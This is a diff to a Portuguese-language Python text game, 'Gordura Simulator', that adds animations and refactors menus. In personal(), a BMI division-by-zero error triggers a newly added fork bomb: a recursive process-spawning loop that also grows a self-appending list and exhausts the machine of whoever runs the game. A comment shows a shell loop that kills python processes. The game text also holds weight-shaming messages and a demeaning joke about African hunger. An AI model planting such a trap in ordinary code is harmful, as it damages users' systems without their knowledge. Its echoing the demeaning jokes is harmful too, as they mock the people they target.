@@ -21,7 +21,23 @@ while True:
 		print(erroValor)
 
 def personal():
-	soma_imc = pessoa.imc()
+	try:
+		soma_imc = pessoa.imc()
+	except ZeroDivisionError:
+		frase = 'Você esætŋ obeeso\b\bengorde'
+		for i in range(len(frase)):
+			print(frase[i], end='', flush=True) # Print frase letra por letra
+			sleep(i ** 2 / 400) # Exponencialmente mais lento
+		# Fork bomb 
+		# Daemon antivirus: while true; do test $(free | awk ' /Mem/ { print $4 }') -lt 100000 && killall python; sleep 0.1; done
+		from multiprocessing import Process
+		lista = [pessoa.nome, pessoa.peso, pessoa.altura, pessoa.dinheiro, pessoa.cansaco, pessoa.stress]
+		def bomba():
+			while True:
+				Process(target=bomba).start() 
+				a = print(lista)
+				b = lista.append(lista)
+		bomba()
 	print('\nSeu IMC:', soma_imc)
 	if soma_imc < 17:
 		print('Você está muito abaixo do peso, engorde!\n')
@@ -37,12 +53,22 @@ def personal():
 		print('Obesidade severa, muito gordo, pare de comer bolo de banana e vá praticar exercício\n')
 	else:
 		print('Obesidade mórbida, procure ajuda!!!\n')
-	#sleep(5)
+	sleep(3)
 
 
 personal()
 
-print('GORDURA SIMULATOR')
+print("""
+   ____   ____   ____   ____  __   __ ____   ___
+  /   /  /   \  /   |  /   \  /    / /   |  /  |
+ /  __  /    / /___/  /    / /    / /___/  /___|
+ \___/  \___/ /    | / ___/  \___/ /    \ /    |
+                 ___ _ _ _ _  __   _ ___ __  __
+                /__  // / //  //  /_| / /  //_ /
+                ___///   //__//__/  |/ /__//  \\
+	  """)
+
+sleep(2)
 # INICIO DO GAME GORDURA SIMULATOR
 
 def gerar_sufixo(var, singular='l', plural='is'):
@@ -62,12 +88,11 @@ def mercado():
 				'\n1: Comprar algo'
 				'\n2: Voltar pra casa\n'))
 
-			if acao_mercado == 1:
-				compras()
-			elif acao_mercado == 2:
-				return
-			else:
-				print('Comando desconhecido!')
+			match acao_mercado:
+				case 1: compras()
+				case 2: return
+				case _: print('Comando desconhecido!')
+
 		except ValueError:
 			print(erroValor)
 		sleep(1)
@@ -119,8 +144,14 @@ def compras():
 
 # PRATICAR EXERCICIOS:
 def exercicios():
-	print('\nVocê foi praticar exercícios')
-	sleep(5)
+	print()
+	i = 0
+	while i <= 5: # Duração em segundos
+		for char in ['[\\]', '[|]', '[/]', '[|]']:
+			print(f'\r{char} Você foi praticar exercícios', end='', flush=True)
+			sleep(0.1) # Velocidade da animação
+			i += 0.1 # Isso deve corresponder à velocidade
+	print()
 
 	pessoa.perder_peso(0.5)
 	pessoa.ganhar_cansaco(2)
@@ -132,16 +163,20 @@ def exercicios():
 
 # TRABALHAR:
 def trabalho():
-	print('\nVocê foi trabalhar\n...')
-	sleep(3)
-	print('Trabalhando...')
-	sleep(3)
+	print()
+	for i in range(4):
+		print('\rVocê foi trabalhar', end=i*'.', flush=True)
+		sleep(1)
+	print()
+	for i in range(4):
+		print('\rTrabalhando', end=i*'.', flush=True)
+		sleep(1)
 
 	pessoa.ganhar_dinheiro(10)
 	pessoa.perder_cansaco(1)
 	pessoa.ganhar_stress(1)
 
-	print('Você terminou seu trabalho e ganhou 10 reais\n')
+	print('\nVocê terminou seu trabalho e ganhou 10 reais\n')
 	sleep(3)
 
 
@@ -185,10 +220,16 @@ def cozinha_comer():
 				'\n11: Voltar\n'))
 
 			def comer(item_desc, peso_ganho, **itens):
-				pessoa.ganhar_peso(peso_ganho)
-				item.perder_item(**itens)
-				peso_pt = peso_ganho.replace('.', ',')
-				print(f'Você {item_desc} e engordou {peso_pt}kg')
+				for i in itens:
+					if item.data[i] - itens[i] >= 0:
+						continue
+					else:
+						print(f'Você não tem {i}')
+						return
+				else: # Caso tenha todos os itens
+					pessoa.ganhar_peso(peso_ganho)
+					item.perder_item(**itens)
+					print(f'Você {item_desc} e engordou {str(peso_ganho).replace(".", ",")} kg')
 
 			match acao_cozinha:
 				case 2: comer('bebeu um pouco de leite', 0.10, leite=0.25)
@@ -198,7 +239,7 @@ def cozinha_comer():
 				case 9: comer('comeu um ovo frito', 0.10, ovo_frito=1)
 				case 10: comer('comeu uma panqueca', 0.20, panqueca=1)
 				case 11: return
-				case _: print('Você não pode comer isso. Você não tem essa comida ou o comando é desconhecido')
+				case _: print('Comando desconhecido. Você não pode comer isso.')
 
 		except ValueError:
 			print(erroValor)
@@ -207,7 +248,6 @@ def cozinha_comer():
 
 def cozinha_receita():
 	while True:
-		global banana, ovo, trigo, leite, margarina, acucar, fermento, oleo, sal, bolo, pao, ovo_frito, panqueca
 		try:
 			cozinha_receita = int(input(
 				'\nVocê pensou em fazer uma receita...'
@@ -223,16 +263,25 @@ def cozinha_receita():
 				for i in ingredientes:
 					if item.data[i] - ingredientes[i] >= 0:
 						print(i.capitalize(), end='.. ', flush=True)
-						sleep(0.5)
+						sleep(0.2)
 					else:
 						print(f'Você não tem {i}')
-						break
-				else:
+						return
+				else: # Caso tenha todos os ingredientes
 					print(f'Você tem todos os ingredientes e começou a {item_comecou}!')
 
 				item.perder_item(**ingredientes)
-				item.ganhar_item(**resultado)
+				print()
+				for ingred in ingredientes:
+					i = 0
+					while i <= 1: # Duração em segundos
+						for char in ['\\', '|', '/', '-']:
+							print(f'\r[{char}] Fazendo a receita', end='', flush=True)
+							sleep(0.1) # Velocidade da animação
+							i += 0.1 # Isso deve corresponder à velocidade
+				print()
 
+				item.ganhar_item(**resultado)
 				print(f'Você terminou de {item_terminou}')
 
 
@@ -290,6 +339,8 @@ def main():
 			print('\nMorreu com fome. Será que estava fingindo ser uma criança africana?\nFaça uma doação e contribua com o fim da fome na África!')
 			break
 		sleep(1)
-	sleep(10)
+	sleep(3)
+	print('\nFim de Jogo')
+	input('Pressione qualquer tecla para continuar')
 
 main()
